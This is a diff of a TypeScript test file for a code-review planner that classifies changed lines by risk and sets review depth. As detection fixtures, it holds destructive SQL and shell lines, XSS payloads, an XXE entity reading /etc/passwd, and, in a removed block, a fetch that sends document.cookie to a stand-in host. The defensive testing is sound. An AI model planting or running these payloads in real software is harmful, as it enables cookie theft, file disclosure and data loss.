@@ -1,12 +1,12 @@
 /**
  * R51: review scales to risk, not size (docs/review-policy.md#review-depth, #risk-classes). The risk classes
- * (lib/review-risk.ts), the UI-text rule (lib/review-depth.ts uiTextOnly), and the routing table: every gate,
+ * (lib/review-risk.ts), the round cap, and the routing table: every gate,
  * security, user-data and money fixture still plans the full panel, and non-risky code is light at any size.
  */
 import { describe, expect, test } from 'bun:test';
 import * as fs from 'node:fs';
 import * as path from 'node:path';
-import { classifyDiff, planReview, scanNumbers, uiTextOnly, type PlanInput } from '../lib/review-depth';
+import { classifyDiff, nextStep, planReview, scanNumbers, type PlanInput } from '../lib/review-depth';
 import { matchRisk, RISK_RULES } from '../lib/review-risk';
 import { targetedClasses } from '../lib/review-targeted';
 import { parseReviewLoop, receiptSummaryLine } from '../lib/ship-receipt';
@@ -28,6 +28,8 @@ describe('risk classes', () => {
     expect(risk(['src/db/users.ts'], { 'src/db/users.ts': ['await sql`DELETE FROM users WHERE id = ${id}`;'] })).toEqual(['data']);
     expect(risk(['app/models/user.rb'], { 'app/models/user.rb': ['User.where(stale: true).destroy_all'] })).toEqual(['data']);
     expect(risk(['src/list.ts'], { 'src/list.ts': ['// delete from the list when done', 'arr.splice(i, 1);'] })).toEqual([]);
+    for (const line of ['db.exec("delete from users");', 'await sql`delete from sessions where id = 1`;', 'DELETE FROM users;', 'drop database app;', 'DROP SCHEMA s;'])
+      expect(risk(['src/db.ts'], { 'src/db.ts': [line] })).toEqual(['data']);
     for (const line of ["const r = spawn('sh', ['-c', cmd], { timeout: 1 });", "Bun.spawn(['bash', '-lc', x]);", "fs.rmSync(t, { recursive: true, force: true });", 'rm -rf "$DIR"'])
       expect(risk(['src/run.ts'], { 'src/run.ts': [line] })).toEqual(['security']);
     expect(risk(['scripts/test-pr-profile.ts', 'lib/storyboard.ts'])).toEqual([]);
@@ -42,36 +44,26 @@ describe('risk classes', () => {
   });
 });
 
-describe('UI or game text is docs (uiTextOnly)', () => {
-  // Value: protects=a copy edit in UI code or a locale file plans light with no code reader; fails_when=a logic change passes as text;
-  //   seam=uiTextOnly and classifyDiff
-  test('text-only pairs pass', () => {
-    expect(uiTextOnly('src/App.tsx', ['  <h1>Welcome back</h1>'], ['  <h1>Good to see you again</h1>'])).toBe(true);
-    expect(uiTextOnly('src/Login.tsx', ['<input placeholder="Email" />'], ['<input placeholder="Work email" />'])).toBe(true);
-    expect(uiTextOnly('locales/en.json', ['  "save": "Save",'], ['  "save": "Save changes",'])).toBe(true);
-    expect(uiTextOnly('game/dialogue/intro.yml', ['greeting: "Halt, traveler!"'], ['greeting: "Stop right there, traveler!"'])).toBe(true);
-    expect(uiTextOnly('po/fr.po', ['msgstr "Bonjour"'], ['msgstr "Salut"'])).toBe(true);
+describe('UI text and SVGs stay code (R51: the docs paths are deferred to an allowlist classifier)', () => {
+  // Value: protects=a copy edit, a Vue binding or a namespaced SVG script never plans as docs; fails_when=any of them leaves the code
+  //   class or its lines skip the risk scan; seam=classifyDiff
+  test.each([
+    ['a JSX copy edit', 'src/App.tsx', ['<h1>Old copy</h1>'], ['<h1>New copy</h1>']],
+    ['a Vue binding', 'src/App.vue', ['<div :title="user.name">Profile</div>'], ['<div :title="leak(document.cookie)">Profile</div>']],
+    ['a locale value', 'locales/en.yml', ['save: "Save"'], ['save: "<img src=x onerror=alert(1)>"']],
+    ['a namespaced SVG script', 'docs/chart.svg', [], ['<svg xmlns:s="http://www.w3.org/2000/svg"><s:script>window.x=42</s:script></svg>']],
+  ])('%s is code', (_n, p, removed, added) => {
+    expect(classifyDiff({ paths: [p], gateTagged: 0, added: { [p]: added }, removed: { [p]: removed }, perPath: [{ path: p, lines: removed.length + added.length, binary: false }] }).class).toBe('code');
   });
-  test('logic, keys, placeholders, scripts and non-UI files never pass', () => {
-    expect(uiTextOnly('src/App.tsx', ['<button onClick={save}>Save</button>'], ['<button onClick={remove}>Save</button>'])).toBe(false);
-    expect(uiTextOnly('src/App.tsx', ['  role = "admin";'], ['  role = "user";'])).toBe(false);
-    expect(uiTextOnly('src/App.tsx', ['<p>{count} items</p>'], ['<p>{total} items</p>'])).toBe(false);
-    expect(uiTextOnly('src/App.vue', ['<script>if (a <b> c) go()</script>'], ['<script>if (a <b> d) go()</script>'])).toBe(false);
-    expect(uiTextOnly('src/App.html', ['<span>{{ name }}</span>'], ['<span>{{ user }}</span>'])).toBe(false);
-    expect(uiTextOnly('locales/en.json', ['  "save": "Save",'], ['  "store": "Save",'])).toBe(false);
-    expect(uiTextOnly('locales/en.json', ['  "hi": "Hi {name}",'], ['  "hi": "Hello",'])).toBe(false);
-    expect(uiTextOnly('locales/en.json', [], ['  "new": "New",'])).toBe(false);
-    expect(uiTextOnly('src/errors.ts', ['throw new Error("bad input");'], ['throw new Error("invalid input");'])).toBe(false);
-    expect(uiTextOnly('src/App.tsx', ['  <h1>Hi</h1>'], ['  <h1>Hi</h1>  '])).toBe(false);
-    expect(uiTextOnly('src/App.tsx', ["  const html = '<p>' + safeName + '</p>';"], ["  const html = '<p>' + rawName + '</p>';"])).toBe(false);
-    expect(uiTextOnly('src/App.vue', ['  el.innerHTML = `<b>hi</b>`;'], ['  el.innerHTML = `<b>bye</b>`;'])).toBe(false);
-    expect(uiTextOnly('src/i18n/loader.ts', ['  endpoint: "https://a.example",'], ['  endpoint: "https://b.example",'])).toBe(false);
-  });
-  test('classifyDiff counts a text-only UI path as docs only when it has the lines', () => {
-    const i = { paths: ['src/App.tsx'], scope: {}, gateTagged: 0, perPath: [{ path: 'src/App.tsx', lines: 2, binary: false }] };
-    const text = { added: { 'src/App.tsx': ['<h1>New copy</h1>'] }, removed: { 'src/App.tsx': ['<h1>Old copy</h1>'] } };
-    expect(classifyDiff({ ...i, ...text })).toMatchObject({ class: 'docs', runtimeLines: 0 });
-    expect(classifyDiff(i)).toMatchObject({ class: 'code', runtimeLines: 2 });
+});
+
+describe('round 2 never ships an unread gate edit', () => {
+  // Value: protects=a gate-class edit after round 1 always gets the owner's eyes; fails_when=a round-2 or fix-check gate edit
+  //   returns done; seam=nextStep
+  test('a gate edit in round 2 or in the fix-check stops for the owner; a plain below-floor fix there finishes', () => {
+    expect(nextStep({ fullPasses: 2, last: 'full', fixedBelow: true, touchedGate: true })).toMatchObject({ step: 'stop', reason: expect.stringContaining('gate-class') });
+    expect(nextStep({ fullPasses: 1, last: 'fix-check', touchedGate: true })).toMatchObject({ step: 'stop', reason: expect.stringContaining('gate-class') });
+    expect(nextStep({ fullPasses: 2, last: 'full', fixedBelow: true }).step).toBe('done');
   });
 });
 
@@ -114,49 +106,6 @@ describe('routing: every gate, security, user-data and money fixture plans the f
     expect([p.depth, roles(p)]).toEqual(['light', ['specialist', 'adversarial-native']]);
     const docs = plan({ paths: ['docs/evals/run.md'], perPath: [{ path: 'docs/evals/run.md', lines: 400, binary: false }], numbers: scanNumbers({ 'docs/evals/run.md': ['recall 33/41'] }) });
     expect([docs.depth, roles(docs)]).toEqual(['light', ['outside-voice']]);
-  });
-});
-
-describe('a research write-up with a chart SVG (R51, gstack-evals#113)', () => {
-  // Value: protects=a write-up with one chart gets one reader, and a malicious SVG never rides the docs path; fails_when=a clean
-  //   chart plans the code reviewers, an active or external SVG plans as docs, or the specialist reads only the SVG; seam=planReview
-  const md = 'docs/evals/run.md';
-  const chart = ['<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 50">', '<defs><linearGradient id="g"/></defs>', '<rect width="40" height="30" fill="url(#g)"/>', '<use href="#bar"/><text x="2" y="48">recall 33/41</text>', '</svg>'];
-  const writeUp = (svg: string[]) => ({ paths: [md, 'docs/evals/chart.svg'], created: [md, 'docs/evals/chart.svg'], added: { [md]: ['recall 33/41'], 'docs/evals/chart.svg': svg }, removed: {},
-    perPath: [{ path: md, lines: 1, binary: false }, { path: 'docs/evals/chart.svg', lines: svg.length, binary: false }], numbers: scanNumbers({ [md]: ['recall 33/41'] }) });
-  test('a clean chart SVG goes light with one reader', () => {
-    const p = plan(writeUp(chart));
-    expect([p.depth, p.class, roles(p)]).toEqual(['light', 'docs', ['outside-voice']]);
-  });
-  test.each([
-    ['a script', '<script>fetch("https://x.example/" + document.cookie)</script>'],
-    ['an on-handler', '<svg onload="alert(1)">'],
-    ['an on-handler on its own line', 'onclick="go()"'],
-    ['an external href', '<image href="https://x.example/a.png"/>'],
-    ['an external xlink:href', '<a xlink:href="http://x.example">'],
-    ['a javascript: link', '<a href="javascript:alert(1)">'],
-    ['a foreignObject', '<foreignObject><div/></foreignObject>'],
-    ['a remote @import', '<style>@import url(https://x.example/a.css);</style>'],
-    ['a remote url()', '<rect fill="url(https://x.example/p.svg#a)"/>'],
-    ['an entity', '<!ENTITY x SYSTEM "file:///etc/passwd">'],
-    ['an animated href', '<set attributeName="href" to="#b"/>'],
-  ])('an SVG with %s stays code', (_n, line) => {
-    expect(plan(writeUp([...chart.slice(0, -1), line, '</svg>'])).class).toBe('code');
-  });
-  test('an attribute split across lines still keeps the SVG code', () => {
-    expect(plan(writeUp(['<svg>', '<rect onclick', '="f()"/>', '</svg>'])).class).toBe('code');
-    expect(plan(writeUp(['<svg>', '<image href', '="https://e.example/a.png"/>', '</svg>'])).class).toBe('code');
-    expect(plan(writeUp(['<svg>', '<use href', '="#a"/>', '</svg>'])).class).toBe('docs');
-  });
-  test('an edited SVG stays code: a changed line may sit inside an existing script block', () => {
-    expect(plan({ ...writeUp(['  draw(next);']), created: [md] }).class).toBe('code');
-  });
-  test('the batched specialist on a write-up reads its text files, not only the SVG', () => {
-    const p = plan(writeUp([...chart.slice(0, -1), '<svg onload="alert(1)">', '</svg>']));
-    const batched = p.dispatches.find(d => d.role === 'specialist')!;
-    expect(batched.exclude.some(e => e.endsWith(md))).toBe(false);
-    const noNumbers = plan({ ...writeUp([...chart.slice(0, -1), '<svg onload="alert(1)">', '</svg>']), numbers: none });
-    expect(noNumbers.dispatches.find(d => d.role === 'specialist')!.exclude.some(e => e.endsWith(md))).toBe(true);
   });
 });
 
